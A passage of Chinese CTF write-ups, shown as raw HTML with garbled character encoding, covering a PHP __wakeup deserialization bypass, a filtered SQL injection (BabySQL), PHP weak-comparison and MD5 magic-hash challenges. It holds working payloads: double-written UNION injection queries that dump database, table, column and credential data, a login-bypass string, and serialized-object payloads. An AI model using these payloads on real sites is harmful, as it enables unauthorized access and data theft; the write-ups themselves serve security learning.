<p><strong>é—®é¢˜å°±æ¥äº†ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šé¦–å…ˆæ‰§è¡Œ</strong><code>__wakeup()</code><strong>é­”æœ¯æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¼šæŠŠæˆ‘ä»¬çš„usernameé‡æ–°èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è€ƒè™‘çš„å°±æ˜¯æ€ä¹ˆè·³è¿‡</strong><code>__wakeup()</code><strong>ï¼Œè€Œå»æ‰§è¡Œ</strong><code>__destruct</code>â€”â€”==å±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡
__wakeup()å‡½æ•°çš„æ‰§è¡Œ==</p>
<p>æ„é€ åºåˆ—åŒ–ï¼šæœ€å®Œæ•´ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;
    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = $username;
        <span class="hljs-keyword">$this</span>-&gt;password = $password;
    &#125;
&#125;
$a = <span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);
var_dump(serialize($a));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>privateç‰ˆæ‰§è¡Œç»“æœ</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;
ä¿®æ”¹å±æ€§ä¸ªæ•°ï¼š
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p>ç®€æ´:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
	<span class="hljs-keyword">public</span> $username=<span class="hljs-string">&#x27;admin&#x27;</span>;
	<span class="hljs-keyword">public</span> $password= <span class="hljs-number">100</span>;
&#125; 
$flag = <span class="hljs-keyword">new</span> Name();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>ç®€æ´ç‰ˆæ‰§è¡Œç»“æœï¼š</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;
ä¿®æ”¹å±æ€§ä¸ªæ•°ï¼š
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p>ä½†è¿˜æ˜¯ä¸è¡Œ/???</p>
<h4 id="private">private</h4>
<p>private
å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§</p>
<p><strong>privateå±æ€§è¢«åºåˆ—åŒ–åå±æ€§å€¼ä¼šå˜æˆ<code>%00ç±»å%00å±æ€§å</code>,åˆ™éœ€åœ¨åˆ›é€ å¯¹è±¡åæ ¹æ®è§„åˆ™è¿›è¡Œä¿®æ”¹ï¼Œé•¿åº¦ä¹Ÿè¦åŠ ä¸Š%00</strong></p>
<p>payload1ï¼š</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220217220200027.png" srcset="/img/loading.gif" alt="image-20220217220200027"></p>
<p>==<strong>æ³¨æ„â—âš ï¼šå¯ä»¥è¿›è¡Œurlç¼–ç ï¼Œé˜²æ­¢%00å¯¹åº”çš„ä¸å¯æ‰“å°å­—ç¬¦åœ¨å¤åˆ¶æ—¶ä¸¢å¤±</strong>==ï¼Œpayload2ï¼š</p>
<pre><code class="hljs php"><span class="hljs-comment">#æœªç¼–ç ç›´æ¥åºåˆ—åŒ–privateï¼š</span>
<span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;  //æ— æ³•æˆåŠŸ</span>
<span class="hljs-keyword">echo</span> urlencode(serialize($a));
<span class="hljs-comment">#ç¼–ç åï¼šå¯ä»¥æˆåŠŸå¾—åˆ°flag</span>
O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A100%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D
<span class="hljs-comment">#å†å°†Nameåé¢çš„2æ¢æˆ3æˆ–å…¶ä»–å€¼å³å¯</span></code></pre>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019babysql">[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2>
<h4 id="è€ƒç‚¹å…³é”®è¯æ›¿æ¢ä¸ºç©ºåå›æ˜¾éƒ¨åˆ†æ•°æ®">è€ƒç‚¹ï¼šå…³é”®è¯æ›¿æ¢ä¸ºç©ºåå›æ˜¾éƒ¨åˆ†æ•°æ®</h4>
<h4 id="ä¸‡èƒ½å¯†ç ä½ç½®">ä¸‡èƒ½å¯†ç ï¼Œä½ç½®ï¼Ÿ</h4>
<blockquote>
<p>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚</p>
<p>è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or
â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™
or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚</p>
<p>å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚
å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or
1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰</p>
<p><strong>åªè¦'or'åé¢çš„å­—ç¬¦ä¸²ä¸ºä¸€ä¸ªéé›¶çš„æ•°å­—å¼€å¤´éƒ½ä¼šè¿”å›True</strong></p>
<pre><code class="hljs awk">select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1abcdefg&#x27;</span>    ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0abcdefg&#x27;</span>    ---&gt;  False
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1&#x27;</span>           ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;2&#x27;</span>           ---&gt;  True
select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0&#x27;</span>           ---&gt;  False</code></pre>
</blockquote>
<p>ç”¨æˆ·åè¾“å…¥admin,å¯†ç æ è¾“å…¥ä¸‡èƒ½å¯†ç <code>amin'or'1</code>ï¼Œå‘ç°ä¸å¯¹ï¼ŒNO,Wrong
username
passwordï¼ï¼ï¼ã€==<strong>åç»­å‘ç°è¿™é‡Œå°±å¯ä»¥çŒœå‡ºæ˜¯replaceäº†å…³é”®å­—ï¼Œä¸ç„¶ä¸å¯èƒ½å›æ˜¾å¯†ç é”™è¯¯ï¼Œè€Œåº”è¯¥çˆ†å‡ºè´¦å·å¯†ç </strong>==ã€‘</p>
<p>å¯†ç è¾“å…¥<code>admin'</code>ï¼Œå›æ˜¾errorï¼Œå¯†ç è¾“å…¥<code>amin'#</code>ï¼Œå›æ˜¾NO,Wrong
username passwordï¼ï¼ï¼ï¼Œè¯´æ˜å¯†ç è¿™å­˜åœ¨å­—ç¬¦æ³¨å…¥</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218143127168.png" srcset="/img/loading.gif" alt="image-20220218143127168" style="zoom:67%;"></p>
<p>ç”¨æˆ·åè¾“å…¥<code>1â€² or 1=1 or '1'='1</code>ï¼Œå¯†ç adminï¼Œå›æ˜¾Errorï¼Œè¯´æ˜ç”¨æˆ·åå‡ºå­˜åœ¨å­—ç¬¦æ³¨å…¥</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218142842677.png" srcset="/img/loading.gif" alt="image-20220218142842677"></p>
<p>ä½†æ˜¯è¿™ä¸ªå›æ˜¾ä¸ºä»€ä¹ˆåªå›æ˜¾ä¸€éƒ¨åˆ†?ä¸æ‡‚ï¼ŒæœwpçŒœæµ‹æ˜¯åˆ æ‰äº†å…³é”®è¯</p>
<p>æ¯”å¦‚passwordè¾“å…¥orï¼Œå›æ˜¾æ²¡è¾“å…¥passwordï¼Œè¯´æ˜åˆ æ‰äº†ï¼ˆè¿‡æ»¤ï¼‰å…³é”®è¯orï¼Œ<code>oror</code>ï¼Œä¹Ÿä¸è¡Œï¼Œ<code>oorr</code>å¯ä»¥ç»•è¿‡ï¼Œå°è¯çŒœæµ‹ï¼Œå°±æ˜¯æŠŠå…³é”®è¯æ¢ä½ç©º</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220222121231.png" srcset="/img/loading.gif" alt="image-20220220222121231" style="zoom: 50%;"></p>
<p>ç„¶åé‡æ–°è¾“å…¥ä¸‡èƒ½å¯†ç ï¼Œå‘ç°æˆåŠŸç™»å½•</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221001708538.png" srcset="/img/loading.gif" alt="image-20220221001708538" style="zoom:50%;"></p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; oorr &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre>
<ol type="1">
<li><p>çŒœæµ‹åˆ—æ•°ï¼Œorderå’Œbyéƒ½è¢«è¿‡æ»¤==ã€‹åŒå†™</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;oorrder bbyy 4 --+  //æŠ¥é”™Unknown column &#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27; in &#x27;</span><span class="hljs-keyword">order</span> claus<span class="hljs-string">e&#x27;</span>
<span class="hljs-string">check.php?username=admin&amp;password=1&#x27;</span>oorrder bbyy <span class="hljs-number">3</span><span class="hljs-comment">--+  //NO,Wrong username passwordï¼ï¼ï¼è¯´æ˜æœ‰3åˆ—</span></code></pre></li>
<li><p>çŒœæµ‹ä½ç½®ï¼ŒåŒç†ï¼Œåªè¾“å…¥union select 1,2,3ï¼ŒæŠ¥é”™version for the
right syntax to use near '1,2,3-- '' at line 1ï¼Œè¯´æ˜<span style="background:#FF9999;">åäº†</span>unionå’Œselectï¼ŒåŒæ ·ç”¨åŒå†™ç»•è¿‡</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220233828652.png" srcset="/img/loading.gif" alt="image-20220220233828652" style="zoom:67%;"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+  //å‘ç°å›æ˜¾ä½ç½®<span class="hljs-number">2</span>,<span class="hljs-number">3</span></code></pre>
<ol start="3" type="1">
<li><p>çˆ†æ•°æ®åº“åï¼šgeek</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>--+</code></pre></li>
<li><p>çˆ†æ‰€æœ‰åº“ï¼šYour password is
'information_schema,mysql,performance_schema,test,ctf,geek'
//å¯ç–‘åº“ï¼šctf</p>
<pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+  // use near &#x27;.schemata,<span class="hljs-number">3</span>-- &#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p><strong>æ³¨æ„â—information.schemaè¢«è¿‡æ»¤å¯èƒ½å› ä¸ºinformationé‡Œçš„orï¼Œè€Œä¸æ˜¯æ•´ä¸ªinformationè¢«è¿‡æ»¤</strong></p></li>
</ol></li>
</ol>
<h4 id="å¦‚ä½•æµ‹è¯•é‚£äº›å…³é”®è¯è¢«è¿‡æ»¤ç”¨ä»€ä¹ˆä»£æ›¿">å¦‚ä½•æµ‹è¯•é‚£äº›å…³é”®è¯è¢«è¿‡æ»¤ï¼Ÿç”¨ä»€ä¹ˆä»£æ›¿ï¼Ÿ</h4>
<p>å…ˆåœ¨passwordå•ç‹¬æµ‹è¯•å…³é”®è¯ï¼Œä¾‹å¦‚passwordè¾“å…¥fromï¼Œå›æ˜¾Input your
username and passwordï¼Œè¯´æ˜è¢«å==ã€‹è¾“å…¥ffromromï¼Œå›æ˜¾NO,Wrong username
passwordï¼ï¼ï¼ï¼ŒæˆåŠŸç»•è¿‡ ==ã€‹<strong><span style="background:#FF9999;">å…ˆæµ‹è¯•å…³é”®è¯+ç»•è¿‡æ–¹æ³•å†æ³¨å…¥ï¼Œä¸ç„¶ä¸çŸ¥é“æ˜¯å“ªä¸ªè¯å‡ºç°äº†é—®é¢˜</span></strong></p>
<p>æˆ–è€…çŸ¥é“å‡ åˆ—åï¼Œåœ¨æŸä¸ªä½ç½®ç”¨''ç›´æ¥å›æ˜¾ï¼Œçœ‹ä»–æ˜¯ä¸æ˜¯è‡ªå·±ï¼Œå°è¯çŒœæƒ³ï¼šreplaceå…³é”®è¯ä¸ºç©º</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;information</span>&#x27;,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220235721090.png" srcset="/img/loading.gif" alt="image-20220220235721090" style="zoom:67%;"></p>
<ol start="5" type="1">
<li><p>çˆ†è¡¨åï¼š'b4bsql,geekuser'</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code></pre></li>
<li><p>çˆ†åˆ—åï¼š'id,username,password'</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="hljs-symbol">&#x27;b4bsql</span>&#x27;<span class="hljs-comment">--+   //æ³¨æ„â—è¦åŠ å¼•å·</span></code></pre></li>
<li><p>çˆ†å…·ä½“æ•°æ®</p>
<pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-params">id</span>,<span class="hljs-params">username</span>,<span class="hljs-params">passwoorrd</span>)</span>) ffromrom b4bsql--+</code></pre>
<p>'1--cl4y--i_want_to_play_2077,2--sql--sql_injection_is_so_fun,3--porn--do_you_know_pornhub,4--git--github_is_different_from_pornhub,5--Stop--you_found_flag_so_stop,6--badguy--i_told_you_to_stop,7--hacker--hack_by_cl4y,8--flag--flag{4a2ddb62-9290-4b79-bce5-c2222e134275}'</p></li>
</ol>
<p>å¾—åˆ°flag</p>
<h2 id="actf2020-æ–°ç”Ÿèµ›backupfileç®€å•">[ACTF2020
æ–°ç”Ÿèµ›]BackupFile(ç®€å•)</h2>
<h4 id="è€ƒç‚¹å¤‡ä»½æ–‡ä»¶å¼±ç±»å‹æ¯”è¾ƒæ•°å­—ç›¸ç­‰">è€ƒç‚¹ï¼šå¤‡ä»½æ–‡ä»¶ã€å¼±ç±»å‹æ¯”è¾ƒï¼šæ•°å­—ç›¸ç­‰</h4>
<p>å¾¡å‰‘æ‰«åˆ°index.php.bakï¼Œå¾—åˆ°æºç </p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221234847834.png" srcset="/img/loading.gif" alt="image-20220221234847834" style="zoom: 67%;"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;
    $key = $_GET[<span class="hljs-string">&#x27;key&#x27;</span>];
    <span class="hljs-keyword">if</span>(!is_numeric($key)) &#123;  <span class="hljs-comment">//keyå¾—æ˜¯æ•°å­—</span>
        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);
    &#125;
    $key = intval($key);
    $str = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;
    <span class="hljs-keyword">if</span>($key == $str) &#123;   <span class="hljs-comment">//å¼±ç±»å‹æ¯”è¾ƒ</span>
        <span class="hljs-keyword">echo</span> $flag;
    &#125;
&#125;
<span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;
&#125;</code></pre>
<p><strong>å¼±æ¯”è¾ƒï¼šå¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œï¼Œåœ¨æ¯”è¾ƒæ—¶è¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚æ‰€ä»¥ç›´æ¥ä¼ å…¥key=123å°±è¡Œ</strong></p>
<p>å¼±ç±»å‹æ¯”è¾ƒè·Ÿ123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3ç›¸ç­‰å³å¯==ã€‹æ•°å­—ï¼Œ123</p>
<h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
<h4 id="è€ƒç‚¹md5å¼±ç±»å‹å¼ºç±»å‹éƒ½è€ƒäº†f12ç½‘ç»œæŠ“åŒ…çœ‹hint">è€ƒç‚¹ï¼šmd5å¼±ç±»å‹+å¼ºç±»å‹éƒ½è€ƒäº†ã€F12ç½‘ç»œæŠ“åŒ…çœ‹hint</h4>
<p>ä¸€å¼€å§‹æ‰¾ä¸åˆ°è¦å¹²å•¥ï¼Œæ‰¾WPå‘ç°ï¼Œè¾“å…¥1ï¼ŒF12æŸ¥çœ‹ç½‘ç»œï¼Œå¾—åˆ°æç¤º/burpæŠ“åŒ…ä¹Ÿèƒ½çœ‹åˆ°ï¼ŒHint:
select * from 'admin' where password=md5($pass,true)</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222000509201.png" srcset="/img/loading.gif" alt="image-20220222000509201" style="zoom:67%;"></p>
<p><strong><em>md5(string,raw):å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE
- åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼ŒFALSE - é»˜è®¤ã€‚32
å­—ç¬¦åå…­è¿›åˆ¶æ•°</em></strong></p>
<p>ä¸‡èƒ½å¯†ç ï¼š</p>
<pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span></code></pre>
<p>å¾—æ‰¾åˆ°æŸä¸ªä¸œè¥¿ä½¿å®ƒmd5 äºŒè¿›åˆ¶åä¸ºä¸‡èƒ½å¯†ç ï¼Œï¼Œçœ‹WP</p>
<ol type="1">
<li>ffifdyopï¼Œmd5 äºŒè¿›åˆ¶åæ˜¯<code>'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code></li>
</ol>
<blockquote>
<p>è¿™é‡Œæä¾›ä¸€ä¸ª==<strong>æœ€å¸¸ç”¨çš„ï¼šffifdyop</strong>==ï¼Œè¯¥å­—ç¬¦ä¸²md5åŠ å¯†åè‹¥rawå‚æ•°ä¸ºTrueæ—¶ä¼šè¿”å›<code>'or'6&lt;trash&gt;</code>
(<code>&lt;trash&gt;</code>å…¶å®å°±æ˜¯ä¸€äº›ä¹±ç å’Œä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œåªè¦ç¬¬ä¸€ä½æ˜¯éé›¶æ•°å­—å³å¯è¢«åˆ¤å®šä¸ºTrueï¼Œåé¢çš„<code>&lt;trash&gt;</code>ä¼šåœ¨MySQLå°†å…¶è½¬æ¢æˆæ•´å‹æ¯”è¾ƒæ—¶ä¸¢æ‰)</p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001300948.png" srcset="/img/loading.gif" alt="image-20220222001300948"></p>
<ol start="2" type="1">
<li>è¾“å…¥åè·³è½¬åˆ°/levels91.php</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001617105.png" srcset="/img/loading.gif" alt="image-20220222001617105" style="zoom:67%;"></p>
<p>æŸ¥çœ‹æºç å¾—åˆ°php</p>
<pre><code class="hljs php">&lt;!--
$a = $GET[<span class="hljs-string">&#x27;a&#x27;</span>];
$b = $_GET[<span class="hljs-string">&#x27;b&#x27;</span>];
<span class="hljs-keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;
    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span>
--&gt;</code></pre>
<p><strong>å…¸å‹çš„md5ç¢°æ’ï¼Œ</strong>è¦æ±‚abä¸åŒä½†md5ç›¸åŒï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œ<strong>å¼±ç±»å‹æ¯”è¾ƒ
å¯ä»¥é€šè¿‡ä¸¤ä¸ª0eå¼€å¤´çš„md5ç»•è¿‡</strong></p>
<p><strong>è¿™é‡Œæä¾›ä¸€äº›md5ä»¥åæ˜¯0eå¼€å¤´çš„å€¼ï¼š</strong>ã€æ›´å¤šå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c5b05c766906">wp</a>ã€‘</p>
<pre><code class="hljs angelscript">QNKCDZO
<span class="hljs-number">0e830400451993494058024219903391</span>

s878926199a
<span class="hljs-number">0e545993274517709034328855841020</span>

s155964671a
<span class="hljs-number">0e342768416822451524974117254469</span>

s214587387a
<span class="hljs-number">0e848240448830537924465865611904</span>

s214587387a
<span class="hljs-number">0e848240448830537924465865611904</span></code></pre>
<p>æ„é€ levels91.php?a=QNKCDZO&amp;b=s878926199aï¼Œå‘ç°åˆè·³è½¬åˆ°æ–°çš„é¡µé¢levell14.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;

highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>]!==$_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;
    <span class="hljs-keyword">echo</span> $flag;
&#125;</code></pre>
